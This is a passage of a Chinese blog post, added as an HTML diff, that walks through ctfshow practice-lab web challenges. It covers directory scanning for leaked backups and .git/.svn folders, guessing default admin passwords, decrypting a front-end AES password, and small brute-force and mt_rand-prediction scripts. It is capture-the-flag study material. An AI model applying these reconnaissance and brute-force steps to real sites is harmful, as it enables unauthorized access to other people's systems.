@@ -1,0 +1,424 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ctfshow靶场 | Hexo</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="信息搜集1F12 &#x3D; view-source:url &#x3D; ctrl+u   view-source是一种协议，早期基本上每个浏览器都支持这个协议。后来Microsoft考虑安全性，对于WindowsXP pack2以及更高版本以后IE就不再支持此协议。但是这个方法在FireFox和Chrome浏览器都还可以使用。 如果要在IE下查看源代码,只能使用查看中的”查看源代码”命令.以前的使用方法：在浏览">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow靶场">
+<meta property="og:url" content="http://example.com/2025/02/05/ctfshow%E9%9D%B6%E5%9C%BA/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="信息搜集1F12 &#x3D; view-source:url &#x3D; ctrl+u   view-source是一种协议，早期基本上每个浏览器都支持这个协议。后来Microsoft考虑安全性，对于WindowsXP pack2以及更高版本以后IE就不再支持此协议。但是这个方法在FireFox和Chrome浏览器都还可以使用。 如果要在IE下查看源代码,只能使用查看中的”查看源代码”命令.以前的使用方法：在浏览">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2025-02-05T02:30:23.000Z">
+<meta property="article:modified_time" content="2025-03-06T08:49:59.788Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/02/05/ctfshow%E9%9D%B6%E5%9C%BA/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ctfshow靶场',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-03-06 16:49:59'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Hexo"><span class="site-name">Hexo</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ctfshow靶场</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-02-05T02:30:23.000Z" title="Created 2025-02-05 10:30:23">2025-02-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-03-06T08:49:59.788Z" title="Updated 2025-03-06 16:49:59">2025-03-06</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ctfshow靶场"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F12 = view-source:url = ctrl+u</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>view-source是一种协议，早期基本上每个浏览器都支持这个协议。后来Microsoft考虑安全性，对于WindowsXP pack2以及更高版本以后IE就不再支持此协议。但是这个方法在FireFox和Chrome浏览器都还可以使用。 如果要在IE下查看源代码,只能使用查看中的”查看源代码”命令.以前的使用方法：在浏览器地址栏中输入 view-source: sURL</p>
+</li>
+<li><p>robots是搜索引擎爬虫协议,robots文件是一个纯文本文件，也就是常见的.txt文件</p>
+<p>域名&#x2F;robots.txt 是可以访问文件</p>
+</li>
+</ul>
+<h2 id="web5-php源码泄露"><a href="#web5-php源码泄露" class="headerlink" title="web5 php源码泄露"></a>web5 php源码泄露</h2><p>备份文件就是常见的源码泄露的方式,PHP 文件常见的备份文件格式有：</p>
+<ol>
+<li>index.phps</li>
+<li>index.php.swp</li>
+<li>index.php.swo </li>
+<li>index.php.php~</li>
+<li>index.php.bak </li>
+<li>index.php.txt </li>
+<li>index.php.old</li>
+</ol>
+<p>一般用御剑或dirsearch扫</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -e php,phps -u https://target</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;index.phps</p>
+<p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web5_1.png"></p>
+<p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web5_2.png"></p>
+<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u https://target</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
+<p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web6_1.png"></p>
+<p>在url后加上&#x2F;<a target="_blank" rel="noopener" href="http://www.zip,下载的压缩包解压后发现fl000g.txt文件,打开后没有发现flag,尝试在url后加/fl000g.txt%E5%8F%91%E7%8E%B0flag">www.zip，下载的压缩包解压后发现fl000g.txt文件，打开后没有发现flag，尝试在url后加/fl000g.txt发现flag</a></p>
+<h2 id="web7"><a href="#web7" class="headerlink" title="*web7"></a>*web7</h2><p>dirsearch扫描访问 &#x2F;.git (单就做题简单，理解难)</p>
+<p>.git文件导致源码泄露：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/105767428">https://blog.csdn.net/qq_45521281/article/details/105767428</a></p>
+<ul>
+<li>开发人员在开发时，常常会先把源码提交到远程托管网站（如github），最后再从远程托管网站把源码pull到服务器的web目录下，如果忘记把.git文件删除，就造成此漏洞。利用.git文件恢复网站的源码，而源码里可能会有数据库的信息。</li>
+<li>当前大量开发人员使用git进行版本控制，对站点自动部署。 如果配置不当，可能会将.git文件夹直接部署到线上环境，这就引起了git泄露漏洞。</li>
+</ul>
+<h2 id="web8"><a href="#web8" class="headerlink" title="*web8"></a>*web8</h2><p>dirsearch扫描访问 &#x2F;.svn (单就做题简单，理解难)</p>
+<p>与git一样，SVN也是常用的代码版本管理工具</p>
+<p>SVN信息泄露漏洞:<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/109306693">https://blog.csdn.net/weixin_39190897/article/details/109306693</a></p>
+<ul>
+<li>SVN（subversion）是程序员常用的源代码版本管理软件。在使用 SVN 管理本地代码过程中，使用 svn checkout 功能来更新代码时，项目目录下会自动生成隐藏的.svn文件夹（Linux上用 ls 命令看不到，要用 ls -al 命令），其中包含重要的源代码信息。</li>
+<li>造成SVN源代码漏洞的主要原因是管理员操作不规范，一些网站管理员在发布代码时，不愿意使用“导出”功能，而是直接复制代码文件夹到WEB服务器上，这就使得.svn隐藏文件夹被暴露于外网环境，黑客对此可进一步利用</li>
+</ul>
+<p>漏洞检测</p>
+<p>1、最简单的检测方法是直接在网站路径后面 + <code>/.svn/entries</code>，存在漏洞会显示数字“12”</p>
+<p>2、用 dirsearch 进行路径扫描</p>
+<p>3、分析文件</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/admintony/svnExploit">svnExploit</a>脚本检测</p>
+<p>漏洞修复</p>
+<p>1、不要使用svn checkout和svn up更新服务器上的代码，使用svn export（导出）功能代替；</p>
+<p>2、服务器软件（Nginx、apache、tomcat、IIS等）设置目录权限，禁止访问.svn目录；</p>
+<p>3、删除 &#x2F;.svn 文件夹，注意，不只svn，git 或者其他版本管理软件也存在类似的问题。</p>
+<h2 id="web9"><a href="#web9" class="headerlink" title="*web9"></a>*web9</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</span><br></pre></td></tr></table></figure>
+
+<p>vim缓存信息泄露：vim编辑器使用时会有一个缓存文件，这个缓存文件在保存时进行删除，但是在vim意外退出时这个缓存文件，会以源文件加一个.swp后缀进行保存</p>
+<p>以 index.php 为例：第一次为.index.php.swp，第二次为 .index.php.swo 的交换文件，第三次为 .index.php.swn</p>
+<p>网页 猜测index.php</p>
+<p>&#x2F;inedx.php.swp</p>
+<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>cookie中的flag</p>
+<h2 id="web11-域名隐藏信息"><a href="#web11-域名隐藏信息" class="headerlink" title="*web11 域名隐藏信息"></a>*web11 域名隐藏信息</h2><p>查询域名解析地址 基本格式：nslookup host [server]</p>
+<p>查询域名的指定解析类型的解析记录 基本格式：nslookup -type&#x3D;type host [server]</p>
+<p>查询全部 基本格式：nslookup -query&#x3D;any host [server]</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nslookup -query=any flag.ctfshow.com</span><br><span class="line">nslookup -qt=txt flag.ctfshow.com</span><br></pre></td></tr></table></figure>
+
+<p> 域名信息泄露，使用dig或者nslookup指定DNS类型进行查找</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dig <span class="operator">-</span>t 指定<span class="type">DNS类型</span>                nslookup <span class="operator">-</span>qt<span class="operator">/</span>ty 指定<span class="type">DNS类型</span></span><br><span class="line"><span class="type">DNS类型：</span> <span class="type">MX：邮件记录</span> <span class="type">TXT：文字记录</span> <span class="type">CNAME：规范名字（可用于域名间的指向）</span> <span class="type">A</span><span class="operator">/</span><span class="type">AAAA：主机</span> <span class="type">NS：域名</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有时候网站上的公开信息，就是管理员常用密码</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;robots.txt 或 dirsearch<br>访问&#x2F;robots.txt 或 使用dirsearch工具，发现子目录&#x2F;admin<br>访问url&#x2F;admin，需要登录，管理员账号猜测为admin，密码根据提示“有时候网站上的公开信息，就是管理员常用密码”，查看靶机主页，发现底部有Help Line Number : 372619038， 尝试输入密码为372619038，登陆成功，获取flag。</p>
+<h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</span><br></pre></td></tr></table></figure>
+
+<p>很多的文章有许多的文档，可以在这些文档中发现很多信息，例如文件中有许多的信息泄露的地方，本题在底部的document这个这个文本中记录到有地址和密码</p>
+<p>注意 文档中的地址是<a target="_blank" rel="noopener" href="http://your-domain/system1103/login.php">http://your-domain/system1103/login.php</a> 实际上your-domain指的是你自己的域名—&gt;这里当然指的是靶场的域名 所以在靶场域名后面加上system1103&#x2F;login.php即可</p>
+<h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</span><br></pre></td></tr></table></figure>
+
+<p>目录扫描发现 &#x2F;editor，访问 &#x2F;editor，点击插入文件 选择文件空间(图片空间也可) 发现可以遍历靶场服务器的文件，在 &#x2F;var&#x2F;www&#x2F;html 下发现 &#x2F;nothinghere&#x2F;fl000g.txt，访问 &#x2F;nothinghere&#x2F;fl000g.txt 得到 flag</p>
+<h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">公开的信息比如邮箱，可能造成信息泄露，产生严重后果</span><br></pre></td></tr></table></figure>
+
+<p><a href="mailto:&#x31;&#49;&#53;&#x36;&#54;&#x33;&#x31;&#57;&#x36;&#x31;&#64;&#113;&#113;&#x2e;&#99;&#111;&#109;">&#x31;&#49;&#53;&#x36;&#54;&#x33;&#x31;&#57;&#x36;&#x31;&#64;&#113;&#113;&#x2e;&#99;&#111;&#109;</a></p>
+<p>通过提示直接去网页下面的邮箱，目录扫描&#x2F;admin，用户名依然默认为admin，密码尝试qq和qq邮箱发现都不对，但是发现忘记密码可以打开，密保问题是问地址在哪，直接去qq搜索就可以看到地址</p>
+<h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</span><br></pre></td></tr></table></figure>
+
+<p>php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息</p>
+<ul>
+<li>根据提示用到php探针知识点</li>
+<li>输入默认探针tz.php，通过类似域名&#x2F;tz.php的方式访问</li>
+<li>打开后点击phpinfo搜索ctf查到flag</li>
+</ul>
+<p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web16_1.png"></p>
+<h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">备份的sql文件会泄露敏感信息</span><br></pre></td></tr></table></figure>
+
+<p>目录扫描到&#x2F;backup.sql，下载下来就可看到flag</p>
+<h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不要着急，休息，休息一会儿，玩101分给你flag</span><br></pre></td></tr></table></figure>
+
+<p>是一个小鸟闯关的游戏，看js源码,发现得分超过一百会弹窗，unicode解码，“你赢了，去幺幺零点皮爱吃皮看看”，&#x2F;110.php得出源码</p>
+<p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web18_1.png"></p>
+<h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密钥什么的，就不要放在前端了</span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web19_1.png"></p>
+<p>看源码发现加密手段</p>
+<p>用户名必须是admin，密码必须加密成以下字符串</p>
+<p>密钥：0000000372619038，初始化向量IV：ilove36dverymuch</p>
+<p>法1：bp抓包直接修改密码</p>
+<p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web19_2.png"></p>
+<p>法2： AES解密<br>模式：CBC  填充： ZeroPadding<br>输出编码： 十六进制hex  偏移量iv: ilove36dverymuch  密钥：0000000372619038<br>密文为： a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</p>
+<p>于是 可得到明文为： i_want_a_36d_girl</p>
+<p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web19_3.png"></p>
+<h2 id="web20-早期asp-access构架的数据库文件mdb"><a href="#web20-早期asp-access构架的数据库文件mdb" class="headerlink" title="web20 早期asp+access构架的数据库文件mdb"></a>web20 早期asp+access构架的数据库文件mdb</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了</span><br></pre></td></tr></table></figure>
+
+<p>dirsearch递归扫</p>
+<p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web20_1.png"></p>
+<p>下载打开搜索可得</p>
+<h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">爆破什么的，都是基操</span><br></pre></td></tr></table></figure>
+
+<p>打开网站发现是登录口，随便填一个bp抓包，账密base64加密且用：隔开,给的字典是爆破密码的</p>
+<p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web21_1.png"></p>
+<p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web21_2.png"></p>
+<p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web21_3.png"></p>
+<h2 id="web22-暂时"><a href="#web22-暂时" class="headerlink" title="**web22 暂时"></a>**web22 暂时</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">域名也可以爆破的，试试爆破这个ctf.show的子域名</span><br></pre></td></tr></table></figure>
+
+<p>用子域名挖掘机或Oneforall工具，挖掘子域名</p>
+<h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">还爆破？这么多代码，告辞！</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">if(isset($_GET[&#x27;token&#x27;]))&#123;</span><br><span class="line">  $token = md5($_GET[&#x27;token&#x27;]);</span><br><span class="line">  if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1))&#123;</span><br><span class="line">    if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))&#123;</span><br><span class="line">      echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>将传入的 <code>token</code> 参数进行 MD5 哈希处理，哈希结果的第 2 位、第 15 位和第 18 位相等，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">2种方法得到token （不同类型）</span><br><span class="line"></span><br><span class="line">第1种： import hashlib</span><br><span class="line"></span><br><span class="line">dic = &#x27;0123456789qazwsxedcrfvtgbyhnujmikolp&#x27;</span><br><span class="line"></span><br><span class="line">for a in dic:</span><br><span class="line"></span><br><span class="line">  for b in dic:</span><br><span class="line"></span><br><span class="line">	t = str(a)+str(b)</span><br><span class="line"></span><br><span class="line">	md5 = hashlib.md5(t.encode(&#x27;utf-8&#x27;)).hexdigest()</span><br><span class="line"></span><br><span class="line">	if md5[1] != md5[14] or md5[14]!= md5[17]:</span><br><span class="line"></span><br><span class="line">		continue</span><br><span class="line"></span><br><span class="line">	if(ord(md5[1]))&gt;=48 and ord(md5[1])&lt;=57 and (ord(md5[31]))&gt;=48 and ord(md5[31])&lt;=57:</span><br><span class="line"></span><br><span class="line">			if((int(md5[1])+int(md5[14])+int(md5[17]))/int(md5[1])==int(md5[31])):</span><br><span class="line"></span><br><span class="line">				print(t)</span><br><span class="line">得到token=3j</span><br><span class="line"></span><br><span class="line">第2种： import hashlib</span><br><span class="line"></span><br><span class="line">for i in range(1,10000):</span><br><span class="line"></span><br><span class="line">md5 = hashlib.md5(str(i).encode(&#x27;utf-8&#x27;)).hexdigest()</span><br><span class="line"></span><br><span class="line">if md5[1] != md5[14] or md5[14]!= md5[17]:</span><br><span class="line">	continue</span><br><span class="line"></span><br><span class="line">if(ord(md5[1]))&gt;=48 and ord(md5[1])&lt;=57 and (ord(md5[31]))&gt;=48 and ord(md5[31])&lt;=57:</span><br><span class="line"></span><br><span class="line">	if((int(md5[1])+int(md5[14])+int(md5[17]))/int(md5[1])==int(md5[31])):</span><br><span class="line"></span><br><span class="line">		print(i)</span><br><span class="line">得到token=422或 token=1202</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">for i in range(10000):</span><br><span class="line"></span><br><span class="line">token = hashlib.md5(str(i).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">if token[1] == token[14] == token[17]:</span><br><span class="line">    if (int(token[1], 16) + int(token[14], 16) + int(token[17], 16)) / int(token[1], 16) == int(token[31], 16):</span><br><span class="line"></span><br><span class="line">        print(f&quot;Found token=&#123;i&#125;,md5=&#123;token&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
+
+<p>结果是422 1202</p>
+<p>直接网址后面跟上?token&#x3D;1访问 然后burpsuit抓包发送到intruder,把1设为变量后,payload设为数值,然后数值范围从1开始到1000,间隔设为1后,点击开始爆破,结果里面有几个长度不一样的值就是结果,</p>
+<h2 id="web24-伪随机数"><a href="#web24-伪随机数" class="headerlink" title="web24 伪随机数"></a>web24 伪随机数</h2><p><strong>mt_rand()函数</strong><br>mt_rand() 函数使用 Mersenne Twister 算法生成随机整数。<br>使用语法：mt_rand(); or mt_rand(min,max);，生成一个区间内的随机数。<br>其参数min默认为最小值0，max默认为可生成的随机数最大值2147483647，由mt_getrandmax()函数获得。</p>
+<p><strong>mt_srand()函数</strong><br>mt_srand() 函数播种 Mersenne Twister 随机数生成器。<br>提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数。当不使用随机数播种函数srand时，php也会自动为随机数播种，因此是否确定种子都不会影响正常运行。</p>
+<p>  在php中每一次调用mt_rand()函数，都会检查一下系统有没有播种。（播种为mt_srand()函数完成），当随机种子生成后，后面生成的随机数都会根据这个随机种子生成。所以同一个种子下，随机数的序列是相同的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	mt_srand(372619038);</span><br><span class="line">	$a=mt_rand();</span><br><span class="line">	echo $a;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>?r&#x3D;1155388967出flag</p>
+<h2 id="web25-伪随机数倒推"><a href="#web25-伪随机数倒推" class="headerlink" title="*web25 伪随机数倒推"></a>*web25 伪随机数倒推</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mt_srand(hexdec(substr(md5($flag), 0,8)));//hexdec 十六进制字符串转换为十进制整数</span><br><span class="line">$rand = intval($r)-intval(mt_rand());</span><br><span class="line">if((!$rand))&#123;//$r要等于这个随机数 </span><br><span class="line">      if($_COOKIE[&#x27;token&#x27;]==(mt_rand()+mt_rand()))&#123;//token为第2和第3次伪随机数的和</span><br><span class="line">          echo $flag;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">      echo $rand;</span><br><span class="line">  